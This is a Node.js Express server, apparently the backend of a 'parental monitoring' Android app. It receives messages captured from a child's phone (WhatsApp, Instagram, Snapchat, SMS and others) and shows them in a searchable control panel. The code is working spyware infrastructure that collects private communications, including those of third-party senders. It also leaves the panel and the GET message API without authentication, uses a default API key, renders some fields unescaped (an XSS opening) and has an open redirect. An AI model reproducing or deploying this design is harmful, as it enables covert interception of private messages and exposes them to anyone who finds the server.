const express = require("express");
const { Pool } = require("pg");

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ================= DATABASE =================
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false },
  max: 10,
  idleTimeoutMillis:      30000,
  connectionTimeoutMillis: 5000,
});

// ================= DB SETUP =================
async function initDB() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS users (
      id        SERIAL PRIMARY KEY,
      device_id TEXT UNIQUE
    );

    CREATE TABLE IF NOT EXISTS global_config (
      id             INT PRIMARY KEY DEFAULT 1,
      uploading      BOOLEAN DEFAULT TRUE,
      cooldown_until BIGINT DEFAULT 0,
      CHECK (id = 1)
    );

    INSERT INTO global_config (id, uploading, cooldown_until)
    VALUES (1, TRUE, 0)
    ON CONFLICT (id) DO NOTHING;

    -- ── PARENTAL MONITORING TABLES ──────────────────────────
    CREATE TABLE IF NOT EXISTS messages (
      id          SERIAL PRIMARY KEY,
      device_id   TEXT,
      source      TEXT,
      sender      TEXT,
      message     TEXT,
      timestamp   BIGINT,
      received_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    );

    CREATE TABLE IF NOT EXISTS message_config (
      id      INT PRIMARY KEY DEFAULT 1,
      api_key TEXT DEFAULT 'change-this-secret-key',
      CHECK (id = 1)
    );

    INSERT INTO message_config (id, api_key)
    VALUES (1, 'change-this-secret-key')
    ON CONFLICT (id) DO NOTHING;
  `);

  // Indexes
  await pool.query(`
    CREATE INDEX IF NOT EXISTS idx_messages_device    ON messages (device_id);
    CREATE INDEX IF NOT EXISTS idx_messages_source    ON messages (source);
    CREATE INDEX IF NOT EXISTS idx_messages_received  ON messages (received_at DESC);
  `);
}
initDB().catch(console.error);

// ================= AUTH MIDDLEWARE (for message API) =================
async function requireApiKey(req, res, next) {
  try {
    const result = await pool.query("SELECT api_key FROM message_config WHERE id=1");
    const validKey = result.rows[0]?.api_key || "change-this-secret-key";
    if (req.headers["x-api-key"] === validKey) return next();
    res.status(403).json({ error: "Unauthorized" });
  } catch (err) {
    res.status(500).json({ error: "Auth check failed" });
  }
}

// ================= SHARED STYLES =================
const sharedStyles = `
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background: #0a0f1e;
      color: #e2e8f0;
      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
      min-height: 100vh;
    }
    .topbar {
      background: #0d1526;
      border-bottom: 1px solid #1e2d4a;
      padding: 16px 32px;
      display: flex;
      align-items: center;
      gap: 12px;
      position: sticky;
      top: 0;
      z-index: 100;
    }
    .topbar .logo {
      font-size: 20px; font-weight: 700;
      color: #22c55e; letter-spacing: -0.5px; text-decoration: none;
    }
    .topbar nav { margin-left: auto; display: flex; gap: 8px; }
    .topbar nav a {
      color: #94a3b8; text-decoration: none;
      padding: 8px 14px; border-radius: 8px;
      font-size: 14px; transition: all 0.2s;
    }
    .topbar nav a:hover { background: #1e2d4a; color: #e2e8f0; }
    .topbar nav a.active { background: #1e2d4a; color: #38bdf8; }

    .page { padding: 36px 32px; max-width: 1200px; margin: 0 auto; }
    .page-title    { font-size: 26px; font-weight: 700; color: #f1f5f9; margin-bottom: 6px; }
    .page-subtitle { font-size: 14px; color: #64748b; margin-bottom: 32px; }

    .card {
      background: #0d1526; border: 1px solid #1e2d4a;
      border-radius: 14px; padding: 24px; margin-bottom: 20px;
    }
    .card h3 {
      font-size: 15px; font-weight: 600; color: #cbd5e1;
      margin-bottom: 18px; padding-bottom: 14px;
      border-bottom: 1px solid #1e2d4a;
      display: flex; align-items: center; gap: 8px;
    }

    .stats-grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
      gap: 16px; margin-bottom: 24px;
    }
    .stat-mini {
      background: #0d1526; border: 1px solid #1e2d4a;
      border-radius: 12px; padding: 20px 24px;
    }
    .stat-mini .num  { font-size: 2.2rem; font-weight: 700; color: #38bdf8; }
    .stat-mini .lbl  { font-size: 0.78rem; color: #64748b; margin-top: 4px; text-transform: uppercase; letter-spacing: 0.6px; }

    .btn {
      padding: 10px 20px; border-radius: 8px;
      font-size: 14px; font-weight: 600;
      cursor: pointer; border: none; transition: all 0.2s;
      text-decoration: none; display: inline-flex; align-items: center; gap: 6px;
    }
    .btn-primary   { background: #22c55e; color: #052e16; }
    .btn-primary:hover { background: #16a34a; }
    .btn-secondary { background: transparent; border: 1px solid #1e2d4a; color: #94a3b8; }
    .btn-secondary:hover { background: #1e2d4a; color: #e2e8f0; }
    .btn-red       { background: #dc2626; color: #fff; }
    .btn-red:hover  { background: #b91c1c; }
    .btn-sky       { background: #0284c7; color: #fff; }
    .btn-sky:hover  { background: #0369a1; }

    .user-list { display: flex; flex-direction: column; gap: 12px; }
    .user-row {
      background: #0d1526; border: 1px solid #1e2d4a;
      border-radius: 12px; padding: 16px 20px;
      display: flex; align-items: center; gap: 16px;
    }
    .user-avatar {
      width: 42px; height: 42px; border-radius: 50%;
      background: #0d2d1a; border: 1px solid #22c55e44;
      display: flex; align-items: center; justify-content: center;
      font-size: 14px; font-weight: 700; color: #22c55e; flex-shrink: 0;
    }
    .user-id      { font-size: 14px; font-weight: 500; color: #cbd5e1; flex: 1; word-break: break-all; }
    .user-actions { display: flex; gap: 10px; flex-shrink: 0; flex-wrap: wrap; }

    .empty-state { padding: 28px; text-align: center; color: #334155; font-size: 14px; }

    /* ── Message monitor styles ── */
    .msg-table { width: 100%; border-collapse: collapse; }
    .msg-table th {
      text-align: left; font-size: 11px; color: #475569;
      text-transform: uppercase; letter-spacing: 0.8px; padding: 10px 16px;
      border-bottom: 1px solid #1e2d4a;
    }
    .msg-table td { padding: 13px 16px; font-size: 14px; color: #cbd5e1; border-top: 1px solid #1e2d4a; vertical-align: top; }
    .msg-table tr:hover td { background: #131f38; }
    .msg-text  { color: #e2e8f0; line-height: 1.5; word-break: break-word; max-width: 420px; }
    .msg-time  { color: #475569; font-size: 12px; white-space: nowrap; }
    .msg-sender { color: #94a3b8; font-size: 13px; }

    .source-badge {
      display: inline-flex; align-items: center;
      padding: 3px 10px; border-radius: 20px;
      font-size: 11px; font-weight: 700; letter-spacing: 0.4px;
      text-transform: uppercase;
    }
    .src-instagram { background: #e1306c22; color: #f472b6; border: 1px solid #e1306c44; }
    .src-whatsapp  { background: #25d36622; color: #4ade80; border: 1px solid #25d36644; }
    .src-sms       { background: #38bdf822; color: #7dd3fc; border: 1px solid #38bdf844; }
    .src-snapchat  { background: #fbbf2422; color: #fde68a; border: 1px solid #fbbf2444; }
    .src-telegram  { background: #229ed922; color: #93c5fd; border: 1px solid #229ed944; }
    .src-discord   { background: #5865f222; color: #a5b4fc; border: 1px solid #5865f244; }
    .src-messenger { background: #0084ff22; color: #60a5fa; border: 1px solid #0084ff44; }
    .src-default   { background: #33415522; color: #94a3b8;  border: 1px solid #33415544; }

    .filter-bar {
      display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 18px;
    }
    .filter-bar select, .filter-bar input {
      background: #0a1628; color: #e2e8f0;
      border: 1px solid #1e2d4a; border-radius: 8px;
      padding: 9px 14px; font-size: 14px; flex: 1; min-width: 140px;
    }
    .filter-bar select:focus, .filter-bar input:focus {
      outline: none; border-color: #38bdf8;
    }

    .count-badge {
      display: inline-flex; align-items: center;
      padding: 3px 10px; border-radius: 20px;
      font-size: 12px; font-weight: 600;
      background: #22c55e18; color: #22c55e;
      border: 1px solid #22c55e33; margin-left: 6px;
    }

    .confirm-modal {
      display: none; position: fixed; inset: 0;
      background: rgba(0,0,0,0.7); z-index: 999;
      align-items: center; justify-content: center;
    }
    .confirm-modal.open { display: flex; }
    .confirm-box {
      background: #0d1526; border: 1px solid #dc262666;
      border-radius: 16px; padding: 32px;
      max-width: 400px; width: 90%; text-align: center;
    }
    .confirm-box h2 { font-size: 20px; color: #f1f5f9; margin-bottom: 10px; }
    .confirm-box p  { font-size: 14px; color: #94a3b8; margin-bottom: 24px; }
    .confirm-box .actions { display: flex; gap: 12px; justify-content: center; }

    .pagination { display: flex; gap: 8px; align-items: center; margin-top: 20px; }
    .pagination a {
      padding: 7px 14px; border-radius: 7px;
      background: #0d1526; border: 1px solid #1e2d4a;
      color: #94a3b8; text-decoration: none; font-size: 13px;
    }
    .pagination a:hover { background: #1e2d4a; color: #e2e8f0; }
    .pagination .current {
      padding: 7px 14px; border-radius: 7px;
      background: #1e2d4a; color: #38bdf8;
      font-size: 13px; font-weight: 700;
    }
    .pagination .info { font-size: 13px; color: #64748b; margin: 0 6px; }
  </style>
`;

// ================= TOPBAR HELPER =================
function topbar(active = "") {
  const link = (href, label, key) =>
    `<a href="${href}" class="${active === key ? "active" : ""}">${label}</a>`;
  return `
    <div class="topbar">
      <a href="/" class="logo">&#9670; Control Panel</a>
      <nav>
        ${link("/",         "Dashboard",  "dashboard")}
        ${link("/users",    "Users",      "users")}
        ${link("/messages", "&#128172; Messages", "messages")}
      </nav>
    </div>
  `;
}

// ================= SOURCE BADGE HELPER =================
function sourceBadge(source) {
  const s = (source || "").toLowerCase();
  const cls = ["instagram","whatsapp","sms","snapchat","telegram","discord","messenger"].includes(s)
    ? `src-${s}` : "src-default";
  return `<span class="source-badge ${cls}">${source || "unknown"}</span>`;
}

// =============================================================
// ========================  DASHBOARD  ========================
// =============================================================
app.get("/", async (req, res) => {
  try {
    const users     = await pool.query("SELECT COUNT(*) FROM users");
    const msgTotal  = await pool.query("SELECT COUNT(*) FROM messages");
    const msgToday  = await pool.query("SELECT COUNT(*) FROM messages WHERE received_at >= CURRENT_DATE");

    const bySource = await pool.query(
      `SELECT source, COUNT(*) AS count FROM messages GROUP BY source ORDER BY count DESC LIMIT 6`
    );

    let sourceRows = bySource.rows.map(r =>
      `<div style="display:flex;align-items:center;justify-content:space-between;padding:10px 0;border-bottom:1px solid #1e2d4a;">
        ${sourceBadge(r.source)}
        <span style="color:#94a3b8;font-size:14px;font-weight:600;">${r.count} msgs</span>
      </div>`
    ).join("") || `<div class="empty-state">No messages yet.</div>`;

    res.send(`
    <html><head><title>Dashboard</title>${sharedStyles}</head>
    <body>
      ${topbar("dashboard")}
      <div class="page">
        <div class="page-title">Dashboard</div>
        <div class="page-subtitle">Control panel overview</div>

        <div class="stats-grid">
          <div class="stat-mini">
            <div class="num">${users.rows[0].count}</div>
            <div class="lbl">&#128100; Total Users</div>
          </div>
          <div class="stat-mini">
            <div class="num" style="color:#f472b6;">${msgTotal.rows[0].count}</div>
            <div class="lbl">&#128172; Total Messages</div>
          </div>
          <div class="stat-mini">
            <div class="num" style="color:#4ade80;">${msgToday.rows[0].count}</div>
            <div class="lbl">&#128197; Messages Today</div>
          </div>
        </div>

        <div class="card">
          <h3>&#128172; Messages by App</h3>
          ${sourceRows}
          <div style="margin-top:16px;">
            <a href="/messages" class="btn btn-sky">&#128269; View All Messages</a>
          </div>
        </div>

        <div style="display:flex; gap:14px; flex-wrap:wrap;">
          <a href="/users" class="btn btn-primary" style="font-size:15px; padding:13px 28px;">
            &#128101; View Users
          </a>
          <a href="/messages" class="btn btn-sky" style="font-size:15px; padding:13px 28px;">
            &#128172; View Messages
          </a>
        </div>
      </div>
    </body></html>
    `);
  } catch (err) {
    console.error("Dashboard error:", err);
    res.status(500).send("Dashboard error");
  }
});

// =============================================================
// =================  MESSAGE API (Android app)  ===============
// =============================================================

// POST /api/messages — called by child's phone
app.post("/api/messages", requireApiKey, async (req, res) => {
  const { device_id, source, sender, message, timestamp } = req.body;
  if (!message || !source) {
    return res.status(400).json({ error: "Missing required fields: source, message" });
  }
  try {
    await pool.query(
      `INSERT INTO messages (device_id, source, sender, message, timestamp)
       VALUES ($1, $2, $3, $4, $5)`,
      [device_id || "unknown", source, sender || "unknown", message, timestamp || Date.now()]
    );
    // Also register device in users table
    await pool.query(
      "INSERT INTO users (device_id) VALUES ($1) ON CONFLICT DO NOTHING",
      [device_id || "unknown"]
    );
    console.log(`[MSG] ${source} | ${sender}: ${message.substring(0, 60)}`);
    res.json({ status: "saved" });
  } catch (err) {
    console.error("/api/messages error:", err);
    res.status(500).json({ error: "Database error" });
  }
});

// GET /api/messages — fetch for external use / API clients
app.get("/api/messages", async (req, res) => {
  const { source, device_id, keyword, limit = 100, offset = 0 } = req.query;
  let conditions = [], params = [], idx = 1;
  if (source)    { conditions.push(`source = $${idx++}`);    params.push(source); }
  if (device_id) { conditions.push(`device_id = $${idx++}`); params.push(device_id); }
  if (keyword)   {
    conditions.push(`(message ILIKE $${idx} OR sender ILIKE $${idx})`);
    params.push(`%${keyword}%`); idx++;
  }
  const where = conditions.length ? `WHERE ${conditions.join(" AND ")}` : "";
  params.push(parseInt(limit), parseInt(offset));
  try {
    const result = await pool.query(
      `SELECT * FROM messages ${where} ORDER BY received_at DESC LIMIT $${idx} OFFSET $${idx+1}`,
      params
    );
    res.json(result.rows);
  } catch (err) {
    res.status(500).json({ error: "Database error" });
  }
});

// GET /api/stats — summary for external API clients
app.get("/api/stats", async (req, res) => {
  try {
    const total    = await pool.query("SELECT COUNT(*) AS count FROM messages");
    const bySource = await pool.query("SELECT source, COUNT(*) AS count FROM messages GROUP BY source ORDER BY count DESC");
    const today    = await pool.query("SELECT COUNT(*) AS count FROM messages WHERE received_at >= CURRENT_DATE");
    res.json({
      total:     parseInt(total.rows[0].count),
      today:     parseInt(today.rows[0].count),
      by_source: bySource.rows.map(r => ({ source: r.source, count: parseInt(r.count) }))
    });
  } catch (err) {
    res.status(500).json({ error: "Database error" });
  }
});

// =============================================================
// =================  MESSAGES DASHBOARD PAGE  =================
// =============================================================
app.get("/messages", async (req, res) => {
  try {
    const PAGE_SIZE = 50;
    const page      = Math.max(1, parseInt(req.query.page || "1"));
    const offset    = (page - 1) * PAGE_SIZE;
    const source    = req.query.source    || "";
    const device_id = req.query.device_id || "";
    const keyword   = req.query.keyword   || "";

    let conditions = [], params = [], idx = 1;
    if (source)    { conditions.push(`source = $${idx++}`);     params.push(source); }
    if (device_id) { conditions.push(`device_id = $${idx++}`);  params.push(device_id); }
    if (keyword)   {
      conditions.push(`(message ILIKE $${idx} OR sender ILIKE $${idx})`);
      params.push(`%${keyword}%`); idx++;
    }
    const where = conditions.length ? `WHERE ${conditions.join(" AND ")}` : "";

    // Count for pagination
    const countRes  = await pool.query(`SELECT COUNT(*) FROM messages ${where}`, params);
    const totalRows = parseInt(countRes.rows[0].count);
    const totalPages = Math.ceil(totalRows / PAGE_SIZE);

    const dataParams = [...params, PAGE_SIZE, offset];
    const msgRes = await pool.query(
      `SELECT * FROM messages ${where} ORDER BY received_at DESC LIMIT $${idx} OFFSET $${idx+1}`,
      dataParams
    );

    // Source dropdown options
    const srcRes = await pool.query("SELECT DISTINCT source FROM messages ORDER BY source");
    const srcOptions = srcRes.rows.map(r =>
      `<option value="${r.source}" ${source === r.source ? "selected" : ""}>${r.source}</option>`
    ).join("");

    // Device dropdown options
    const devRes = await pool.query("SELECT DISTINCT device_id FROM messages ORDER BY device_id");
    const devOptions = devRes.rows.map(r =>
      `<option value="${r.device_id}" ${device_id === r.device_id ? "selected" : ""}>${r.device_id}</option>`
    ).join("");

    // Stats row
    const todayCount  = await pool.query("SELECT COUNT(*) FROM messages WHERE received_at >= CURRENT_DATE");
    const totalCount  = await pool.query("SELECT COUNT(*) FROM messages");
    const bySourceAll = await pool.query("SELECT source, COUNT(*) AS c FROM messages GROUP BY source ORDER BY c DESC");

    // Build message rows
    const msgRows = msgRes.rows.map(m => `
      <tr>
        <td>${sourceBadge(m.source)}</td>
        <td class="msg-sender">${escHtml(m.sender || "unknown")}</td>
        <td class="msg-text">${escHtml(m.message)}</td>
        <td style="color:#64748b;font-size:12px;">${escHtml(m.device_id || "")}</td>
        <td class="msg-time">${new Date(m.received_at).toLocaleString("en-IN", {timeZone:"Asia/Kolkata"})}</td>
        <td>
          <form method="POST" action="/messages/delete/${m.id}">
            <input type="hidden" name="_redirect" value="/messages?page=${page}&source=${source}&device_id=${device_id}&keyword=${encodeURIComponent(keyword)}">
            <button type="submit" class="btn btn-red" style="padding:5px 10px;font-size:12px;">&#10005;</button>
          </form>
        </td>
      </tr>
    `).join("") || `<tr><td colspan="6" class="empty-state">No messages found.</td></tr>`;

    // Pagination links
    const buildUrl = (p) => {
      const q = new URLSearchParams({ page: p });
      if (source)    q.set("source",    source);
      if (device_id) q.set("device_id", device_id);
      if (keyword)   q.set("keyword",   keyword);
      return "/messages?" + q.toString();
    };
    let paginationHtml = "";
    if (totalPages > 1) {
      paginationHtml = `<div class="pagination">`;
      if (page > 1) paginationHtml += `<a href="${buildUrl(page-1)}">&larr; Prev</a>`;
      paginationHtml += `<span class="current">${page}</span>`;
      paginationHtml += `<span class="info">of ${totalPages} (${totalRows} total)</span>`;
      if (page < totalPages) paginationHtml += `<a href="${buildUrl(page+1)}">Next &rarr;</a>`;
      paginationHtml += `</div>`;
    }

    res.send(`
    <html><head><title>Messages</title>${sharedStyles}</head>
    <body>
      ${topbar("messages")}
      <div class="page">
        <div class="page-title">&#128172; Message Monitor</div>
        <div class="page-subtitle">All messages captured from child's device</div>

        <div class="stats-grid" style="grid-template-columns: repeat(auto-fill, minmax(160px,1fr));">
          <div class="stat-mini">
            <div class="num" style="color:#38bdf8;">${totalCount.rows[0].count}</div>
            <div class="lbl">Total Messages</div>
          </div>
          <div class="stat-mini">
            <div class="num" style="color:#4ade80;">${todayCount.rows[0].count}</div>
            <div class="lbl">Today</div>
          </div>
          ${bySourceAll.rows.slice(0,4).map(r => `
          <div class="stat-mini">
            <div class="num" style="font-size:1.6rem;">${r.c}</div>
            <div class="lbl">${r.source}</div>
          </div>`).join("")}
        </div>

        <div class="card">
          <h3>&#128269; Filter Messages</h3>
          <form method="GET" action="/messages">
            <div class="filter-bar">
              <select name="source">
                <option value="">All Apps</option>
                ${srcOptions}
              </select>
              <select name="device_id">
                <option value="">All Devices</option>
                ${devOptions}
              </select>
              <input name="keyword" placeholder="Search message or sender..." value="${escHtml(keyword)}"/>
              <button type="submit" class="btn btn-sky">Search</button>
              <a href="/messages" class="btn btn-secondary">Clear</a>
            </div>
          </form>
        </div>

        <div class="card" style="padding:0; overflow:hidden;">
          <div style="padding:18px 24px; border-bottom:1px solid #1e2d4a; display:flex; align-items:center; gap:10px; flex-wrap:wrap;">
            <span style="font-weight:600; color:#cbd5e1;">Messages</span>
            <span class="count-badge">${totalRows} found</span>
            <form method="POST" action="/messages/delete-all" style="margin-left:auto;">
              <input type="hidden" name="source"    value="${source}">
              <input type="hidden" name="device_id" value="${device_id}">
              <button type="submit" class="btn btn-red" style="font-size:12px; padding:7px 14px;"
                onclick="return confirm('Delete ALL matching messages? This cannot be undone.')">
                &#128465; Delete All Matching
              </button>
            </form>
          </div>
          <div style="overflow-x:auto;">
            <table class="msg-table">
              <thead><tr>
                <th>App</th><th>From</th><th>Message</th>
                <th>Device</th><th>Time</th><th></th>
              </tr></thead>
              <tbody>${msgRows}</tbody>
            </table>
          </div>
        </div>

        ${paginationHtml}
      </div>
    </body></html>
    `);
  } catch (err) {
    console.error("/messages error:", err);
    res.status(500).send("Error loading messages");
  }
});

// ================= DELETE SINGLE MESSAGE =================
app.post("/messages/delete/:id", async (req, res) => {
  try {
    await pool.query("DELETE FROM messages WHERE id=$1", [req.params.id]);
  } catch (err) { console.error("delete msg error:", err); }
  res.redirect(req.body._redirect || "/messages");
});

// ================= DELETE ALL MATCHING MESSAGES =================
app.post("/messages/delete-all", async (req, res) => {
  const { source, device_id } = req.body;
  let conditions = [], params = [], idx = 1;
  if (source)    { conditions.push(`source = $${idx++}`);    params.push(source); }
  if (device_id) { conditions.push(`device_id = $${idx++}`); params.push(device_id); }
  const where = conditions.length ? `WHERE ${conditions.join(" AND ")}` : "";
  try {
    await pool.query(`DELETE FROM messages ${where}`, params);
  } catch (err) { console.error("delete-all msg error:", err); }
  res.redirect("/messages");
});

// ================= DELETE MESSAGES FOR A DEVICE =================
app.post("/messages/delete-device/:device_id", async (req, res) => {
  try {
    await pool.query("DELETE FROM messages WHERE device_id=$1", [req.params.device_id]);
  } catch (err) { console.error("delete device msgs error:", err); }
  res.redirect("/user/" + req.params.device_id + "/messages");
});

// ================= PER-DEVICE MESSAGE VIEW =================
app.get("/user/:device_id/messages", async (req, res) => {
  const device  = req.params.device_id;
  const source  = req.query.source  || "";
  const keyword = req.query.keyword || "";
  const PAGE_SIZE = 50;
  const page   = Math.max(1, parseInt(req.query.page || "1"));
  const offset = (page - 1) * PAGE_SIZE;

  try {
    let conditions = [`device_id = $1`], params = [device], idx = 2;
    if (source)  { conditions.push(`source = $${idx++}`); params.push(source); }
    if (keyword) {
      conditions.push(`(message ILIKE $${idx} OR sender ILIKE $${idx})`);
      params.push(`%${keyword}%`); idx++;
    }
    const where = `WHERE ${conditions.join(" AND ")}`;

    const countRes   = await pool.query(`SELECT COUNT(*) FROM messages ${where}`, params);
    const totalRows  = parseInt(countRes.rows[0].count);
    const totalPages = Math.ceil(totalRows / PAGE_SIZE);

    const dataParams = [...params, PAGE_SIZE, offset];
    const msgRes = await pool.query(
      `SELECT * FROM messages ${where} ORDER BY received_at DESC LIMIT $${idx} OFFSET $${idx+1}`,
      dataParams
    );

    const srcRes = await pool.query(
      "SELECT DISTINCT source FROM messages WHERE device_id=$1 ORDER BY source", [device]
    );
    const srcOptions = srcRes.rows.map(r =>
      `<option value="${r.source}" ${source === r.source ? "selected" : ""}>${r.source}</option>`
    ).join("");

    const msgRows = msgRes.rows.map(m => `
      <tr>
        <td>${sourceBadge(m.source)}</td>
        <td class="msg-sender">${escHtml(m.sender || "unknown")}</td>
        <td class="msg-text">${escHtml(m.message)}</td>
        <td class="msg-time">${new Date(m.received_at).toLocaleString("en-IN",{timeZone:"Asia/Kolkata"})}</td>
        <td>
          <form method="POST" action="/messages/delete/${m.id}">
            <input type="hidden" name="_redirect" value="/user/${device}/messages?page=${page}&source=${source}&keyword=${encodeURIComponent(keyword)}">
            <button type="submit" class="btn btn-red" style="padding:5px 10px;font-size:12px;">&#10005;</button>
          </form>
        </td>
      </tr>
    `).join("") || `<tr><td colspan="5" class="empty-state">No messages found.</td></tr>`;

    const buildUrl = (p) => {
      const q = new URLSearchParams({ page: p });
      if (source)  q.set("source",  source);
      if (keyword) q.set("keyword", keyword);
      return `/user/${device}/messages?` + q.toString();
    };
    let paginationHtml = "";
    if (totalPages > 1) {
      paginationHtml = `<div class="pagination">`;
      if (page > 1) paginationHtml += `<a href="${buildUrl(page-1)}">&larr; Prev</a>`;
      paginationHtml += `<span class="current">${page}</span><span class="info">of ${totalPages}</span>`;
      if (page < totalPages) paginationHtml += `<a href="${buildUrl(page+1)}">Next &rarr;</a>`;
      paginationHtml += `</div>`;
    }

    res.send(`
    <html><head><title>Messages — ${device}</title>${sharedStyles}</head>
    <body>
      ${topbar("messages")}
      <div class="page">
        <a href="/users" class="btn btn-secondary" style="margin-bottom:24px;">&larr; Back</a>
        <div class="page-title" style="margin-top:16px;">&#128172; Messages</div>
        <div class="page-subtitle" style="font-family:monospace;">${device}</div>

        <div class="card">
          <h3>&#128269; Filter</h3>
          <form method="GET">
            <div class="filter-bar">
              <select name="source">
                <option value="">All Apps</option>${srcOptions}
              </select>
              <input name="keyword" placeholder="Search..." value="${escHtml(keyword)}"/>
              <button type="submit" class="btn btn-sky">Search</button>
              <a href="/user/${device}/messages" class="btn btn-secondary">Clear</a>
            </div>
          </form>
        </div>

        <div class="card" style="padding:0; overflow:hidden;">
          <div style="padding:18px 24px; border-bottom:1px solid #1e2d4a; display:flex; align-items:center; gap:10px;">
            <span style="font-weight:600; color:#cbd5e1;">Messages</span>
            <span class="count-badge">${totalRows}</span>
            <form method="POST" action="/messages/delete-device/${device}" style="margin-left:auto;"
              onsubmit="return confirm('Delete ALL messages for this device?')">
              <button type="submit" class="btn btn-red" style="font-size:12px;padding:7px 14px;">&#128465; Delete All</button>
            </form>
          </div>
          <div style="overflow-x:auto;">
            <table class="msg-table">
              <thead><tr><th>App</th><th>From</th><th>Message</th><th>Time</th><th></th></tr></thead>
              <tbody>${msgRows}</tbody>
            </table>
          </div>
        </div>
        ${paginationHtml}
      </div>
    </body></html>
    `);
  } catch (err) {
    console.error("/user/messages error:", err);
    res.status(500).send("Error loading messages");
  }
});

app.post("/delete-user/:device_id", async (req, res) => {
  const { device_id } = req.params;
  try {
    await pool.query("DELETE FROM messages  WHERE device_id=$1", [device_id]);
    await pool.query("DELETE FROM users     WHERE device_id=$1", [device_id]);
    res.redirect("/users");
  } catch (err) { res.status(500).send("Error deleting user"); }
});

// =============================================================
// =======================  USERS LIST  ========================
// =============================================================
app.get("/users", async (req, res) => {
  try {
    const users = await pool.query("SELECT * FROM users");
    let rows = "";
    for (const u of users.rows) {
      const initials  = u.device_id.substring(0, 2).toUpperCase();
      const msgCount  = await pool.query("SELECT COUNT(*) FROM messages WHERE device_id=$1", [u.device_id]);
      rows += `
        <div class="user-row" id="user-${u.device_id}">
          <div class="user-avatar">${initials}</div>
          <div class="user-id">${u.device_id}</div>
          <div class="user-actions">
            <a href="/user/${u.device_id}/messages" class="btn btn-sky">
              &#128172; Messages <span class="count-badge">${msgCount.rows[0].count}</span>
            </a>
            <button class="btn btn-red" onclick="confirmDeleteUser('${u.device_id}')">
              &#128465; Delete
            </button>
          </div>
        </div>
      `;
    }

    res.send(`
    <html><head><title>Users</title>${sharedStyles}</head>
    <body>
      ${topbar("users")}
      <div class="confirm-modal" id="deleteUserModal">
        <div class="confirm-box">
          <h2>&#9888; Delete User?</h2>
          <p>This will permanently delete the user and <strong>all their messages</strong>. This cannot be undone.</p>
          <div class="actions">
            <button class="btn btn-secondary" onclick="closeModal('deleteUserModal')">Cancel</button>
            <form id="deleteUserForm" method="POST">
              <button type="submit" class="btn btn-red">Yes, Delete</button>
            </form>
          </div>
        </div>
      </div>
      <div class="page">
        <a href="/" class="btn btn-secondary" style="margin-bottom:24px;">&larr; Back</a>
        <div class="page-title" style="margin-top:16px;">All Users</div>
        <div class="page-subtitle">${users.rows.length} registered device(s)</div>
        <div class="user-list">
          ${rows || '<div class="empty-state">No users found.</div>'}
        </div>
      </div>
      <script>
        function confirmDeleteUser(deviceId) {
          document.getElementById('deleteUserForm').action = '/delete-user/' + deviceId;
          document.getElementById('deleteUserModal').classList.add('open');
        }
        function closeModal(id) { document.getElementById(id).classList.remove('open'); }
      </script>
    </body></html>
    `);
  } catch (err) { res.status(500).send("Error loading users"); }
});

// =============================================================
// =====================  UTILITY ROUTES  ======================
// =============================================================

function escHtml(str) {
  return String(str || "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

// Health check
app.get("/health", async (req, res) => {
  try {
    await pool.query("SELECT 1");
    res.json({ status: "ok", db: "connected", time: new Date().toISOString() });
  } catch (e) {
    res.status(500).json({ status: "error", db: "disconnected" });
  }
});

// Global error handler — prevents server crashes
app.use((err, req, res, next) => {
  console.error("Unhandled error:", err);
  if (!res.headersSent) res.status(500).send("Internal server error");
});

app.listen(process.env.PORT || 3000, () => {
  console.log("✅ Server running on port", process.env.PORT || 3000);
});
